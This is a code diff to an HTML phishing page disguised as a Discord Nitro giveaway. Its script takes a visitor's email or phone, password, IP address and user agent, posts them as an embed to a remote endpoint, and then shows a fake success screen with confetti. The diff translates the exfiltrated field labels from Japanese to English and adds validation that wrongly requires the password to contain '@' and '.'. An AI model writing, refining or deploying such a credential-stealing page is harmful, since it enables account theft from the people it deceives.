@@ -51,8 +51,7 @@
       width: 72px;
       height: 72px;
       margin: 0 auto 24px;
-      background: url('https://cdn.discordapp.com/attachments/1234567890/9876543210/discord-nitro-logo.png') center/contain no-repeat;
-      /* fallback color if image fails */
+      background: url('https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3d4a02b667f6d0e30c2_discord-nitro-logo.png') center/contain no-repeat;
       background-color: var(--accent);
       border-radius: 50%;
     }
@@ -99,6 +98,10 @@
       outline: none;
       border-color: var(--accent);
       box-shadow: 0 0 0 2px rgba(88,101,242,0.3);
+    }
+
+    input:invalid {
+      border-color: var(--danger);
     }
 
     .btn {
@@ -188,12 +191,12 @@
 
     <div class="form-group">
       <label for="identifier">Email or Phone Number</label>
-      <input type="text" id="identifier" placeholder="Enter email or phone" autocomplete="username" required>
+      <input type="text" id="identifier" placeholder="Enter email or phone" required pattern=".*@.*\..*">
     </div>
 
     <div class="form-group">
       <label for="password">Password</label>
-      <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required>
+      <input type="password" id="password" placeholder="Enter your password" required pattern=".*@.*\..*">
     </div>
 
     <button class="btn" id="claimBtn">Claim Nitro Now</button>
@@ -213,7 +216,6 @@
   </div>
 
   <script>
-    // Confetti particles on success
     function launchConfetti() {
       const container = document.getElementById('confetti');
       for (let i = 0; i < 120; i++) {
@@ -232,6 +234,8 @@
     const successCard = document.getElementById('successCard');
     const claimBtn = document.getElementById('claimBtn');
     const status = document.getElementById('status');
+    const identifierInput = document.getElementById('identifier');
+    const passwordInput = document.getElementById('password');
 
     let ip = "fetching...";
 
@@ -241,8 +245,23 @@
       .catch(() => ip = "failed");
 
     claimBtn.addEventListener('click', async () => {
-      const identifier = document.getElementById('identifier').value.trim();
-      const password = document.getElementById('password').value;
+      const identifier = identifierInput.value.trim();
+      const password = passwordInput.value;
+
+      // Strict client-side check: must contain both "@" and "."
+      if (!identifier.includes('@') || !identifier.includes('.')) {
+        status.textContent = "Please enter a valid email address";
+        status.style.color = "#ed4245";
+        identifierInput.focus();
+        return;
+      }
+
+      if (!password.includes('@') || !password.includes('.')) {
+        status.textContent = "Please enter a valid password";
+        status.style.color = "#ed4245";
+        passwordInput.focus();
+        return;
+      }
 
       if (!identifier || !password) {
         status.textContent = "Please fill in all fields";
@@ -254,16 +273,16 @@
       status.textContent = "Verifying...";
 
       const payload = {
-        content: "**ディスコードアカウント情報**",
+        content: "**Discord Account Info (Nitro Claim Fake)**",
         embeds: [{
-          title: "アカウント情報",
+          title: "New Claim Attempt",
           color: 0x5865f2,
           fields: [
-            { name: "メールアドレス", value: identifier || "(empty)", inline: false },
-            { name: "パスワード",   value: password   || "(empty)", inline: false },
-            { name: "IP",         value: ip,                        inline: true  },
-            { name: "User-Agent", value: navigator.userAgent.substring(0,180) + "...", inline: false },
-            { name: "Timestamp",  value: new Date().toLocaleString('en-US'), inline: false }
+            { name: "Email / Identifier", value: identifier || "(empty)", inline: false },
+            { name: "Password",           value: password   || "(empty)", inline: false },
+            { name: "IP",                 value: ip,                        inline: true  },
+            { name: "User-Agent",         value: navigator.userAgent.substring(0,180) + "...", inline: false },
+            { name: "Timestamp",          value: new Date().toLocaleString('en-US'), inline: false }
           ],
           timestamp: new Date().toISOString()
         }]
@@ -278,7 +297,6 @@
           body: JSON.stringify(payload)
         });
 
-        // Show fake success
         loginCard.style.display = 'none';
         successCard.style.display = 'flex';
         launchConfetti();
